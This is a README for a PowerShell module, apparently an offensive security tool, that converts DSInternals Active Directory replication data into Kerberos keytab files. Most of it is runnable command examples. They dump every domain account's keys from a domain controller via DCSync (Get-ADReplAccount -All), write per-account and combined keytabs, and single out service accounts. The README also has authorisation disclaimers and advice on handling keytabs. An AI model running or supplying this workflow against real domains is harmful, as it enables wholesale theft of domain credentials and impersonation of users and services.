# Kerberos Keytab Generator

PowerShell module for converting DSInternals Active Directory objects to Kerberos keytab files for authorised security testing and research.

## 📋 Prerequisites

- PowerShell 5.1 or PowerShell Core 7+
- [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) PowerShell module
- Administrative privileges (for AD replication operations)
- DCSync rights or equivalent permissions

## 🚀 Installation

```powershell
# Install DSInternals module (if not installed)
Install-Module DSInternals -Scope CurrentUser

# Import the keytab generator module
Import-Module .\KeytabGenerator.psm1
```

## 📖 Usage

### Basic Workflow

```powershell
# 1. Retrieve AD account data using DSInternals
$accounts = Get-ADReplAccount -All -Server "DC01.contoso.local"

# 2. Convert DSInternals objects to keytab-compatible format
$keys = ConvertFrom-DSInternals -DSInternalsObjects $accounts

# 3. Generate individual keytab files
New-Keytabs -AccountKeys $keys `
            -OutputDirectory "C:\temp\keytabs" `
            -Realm "CONTOSO.LOCAL"

# 4. Generate combined keytab (optional)
New-Keytabs -AccountKeys $keys `
            -OutputDirectory "C:\temp\keytabs" `
            -Realm "CONTOSO.LOCAL" `
            -CreateCombined

# 5. Verify keytab contents
Read-Keytab -KeytabPath "C:\temp\keytabs\administrator.keytab"
```

### Single Account Extraction

```powershell
# Extract keys for a specific account
$account = Get-ADReplAccount -SamAccountName "svc_sql" -Server "DC01.contoso.local"
$keys = ConvertFrom-DSInternals -DSInternalsObjects $account
New-Keytabs -AccountKeys $keys `
            -OutputDirectory "C:\keytabs" `
            -Realm "CONTOSO.LOCAL"
```

### Output Format Options

```powershell
# Get keys as byte arrays (default)
$keys = ConvertFrom-DSInternals -DSInternalsObjects $accounts -Format ByteArrays

# Get keys as hex strings
$keys = ConvertFrom-DSInternals -DSInternalsObjects $accounts -Format Strings

# Display formatted output
$keys.ToString()
```

## 🔧 Functions

### ConvertFrom-DSInternals
Converts DSInternals account objects to a hashtable of Kerberos keys.

**Parameters:**
- `-DSInternalsObjects`: DSInternals account objects (mandatory)
- `-Format`: Output format - "ByteArrays" (default) or "Strings"

**Returns:** Hashtable with account names as keys and encryption keys as values

### New-Keytabs
Creates keytab files from converted account keys.

**Parameters:**
- `-AccountKeys`: Hashtable from ConvertFrom-DSInternals (mandatory)
- `-OutputDirectory`: Path for keytab files (mandatory)
- `-Realm`: Kerberos realm name (mandatory)
- `-CreateCombined`: Switch to create combined.keytab with all accounts

### Read-Keytab
Reads and displays keytab file contents for verification.

**Parameters:**
- `-KeytabPath`: Path to keytab file (mandatory)

### Format-KeysToString
Formats account keys as readable text output.

## 🔐 Supported Encryption Types

| Type | Algorithm | Description |
|------|-----------|-------------|
| 23 | RC4-HMAC | NTLM hash-based |
| 17 | AES256-CTS-HMAC-SHA1-96 | Modern AES256 |
| 18 | AES128-CTS-HMAC-SHA256-128 | AES128 with SHA256 |
| 19 | AES256-CTS-HMAC-SHA384-192 | AES256 with SHA384 |
| 16 | AES128-CTS-HMAC-SHA1-96 | Standard AES128 |
| 1-3 | DES variants | Legacy (if present) |

## 📊 Examples

### Automated Multi-Account Export

```powershell
# Export keytabs for service accounts
$serviceAccounts = Get-ADReplAccount -All -Server "DC01.contoso.local" | 
    Where-Object { $_.SamAccountName -like "svc_*" }

$keys = ConvertFrom-DSInternals -DSInternalsObjects $serviceAccounts
New-Keytabs -AccountKeys $keys `
            -OutputDirectory "C:\ServiceKeytabs" `
            -Realm "CONTOSO.LOCAL" `
            -CreateCombined
```

### Pipeline Processing

```powershell
# Direct pipeline usage
Get-ADReplAccount -All -Server "DC01.contoso.local" |
    ConvertFrom-DSInternals |
    ForEach-Object { 
        New-Keytabs -AccountKeys $_ `
                    -OutputDirectory "C:\Keytabs" `
                    -Realm "CONTOSO.LOCAL" 
    }
```

### Verification and Analysis

```powershell
# Verify all generated keytabs
Get-ChildItem "C:\Keytabs\*.keytab" | ForEach-Object {
    Write-Host "=== $($_.Name) ===" -ForegroundColor Cyan
    Read-Keytab -KeytabPath $_.FullName
}
```

## 🛡️ Security Considerations

**⚠️ CRITICAL**: Keytab files contain authentication credentials equivalent to passwords.

### Secure Handling
- Store keytabs in encrypted locations only
- Set restrictive file permissions (owner-only access)
- Delete keytabs immediately after testing
- Never commit keytabs to version control
- Use dedicated test accounts where possible

### Authorisation Requirements
- Only use on systems you own or have explicit permission to test
- Document all testing activities for compliance
- Follow organisational red team procedures
- Ensure proper authorisation documentation

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| "Access denied" errors | Verify DCSync rights and run as administrator |
| Empty keytab files | Check if accounts have Kerberos keys enabled |
| Module import fails | Ensure DSInternals is installed correctly |
| Invalid realm error | Use uppercase realm name (e.g., CONTOSO.LOCAL) |
| Missing keys | Verify account has logged in with Kerberos authentication |

## 📝 Keytab File Format

Generated keytabs conform to MIT Kerberos format v5.2:
- Compatible with standard Kerberos tools (kinit, klist, ktutil)
- Big-endian byte ordering
- Multiple encryption types per principal
- Zero timestamp for permanent validity

## ⚖️ Legal Disclaimer

This tool is provided for authorised security testing and research purposes only. Users are solely responsible for compliance with all applicable laws and regulations. 

**By using this tool, you acknowledge:**
- You have explicit authorisation to test target systems
- You understand the security implications
- You accept full responsibility for your actions

## 📧 Contact

**GitHub:** [EnsignKilos](https://github.com/EnsignKilos)

---

*Use responsibly. Test ethically. Stay legal.*
